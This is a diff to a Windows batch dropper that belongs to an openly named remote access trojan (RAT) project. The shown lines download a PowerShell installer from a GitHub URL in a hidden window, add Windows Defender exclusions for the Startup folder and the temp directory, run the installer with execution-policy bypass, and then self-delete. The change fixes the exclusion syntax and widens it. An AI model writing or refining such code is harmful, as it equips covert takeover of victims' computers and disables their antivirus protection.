@@ -30,8 +30,9 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 
 REM rat resources
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/tarasermolenko/RemoteAccessTool/blob/main/files/rat_installer.ps1 -OutFile rat_installer.ps1"; 
-Add-MpPreference _exclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/rat_installer.ps1";
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/tarasermolenko/RemoteAccessTool/blob/main/files/rat_installer.ps1 -OutFile rat_installer.ps1"
+Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+Add-MpPreference -ExclusionPath "$env:temp"
 powershell powershell.exe -windowstyle hidden -ep bypass ./rat_installer.ps1
 
 @REM self delete
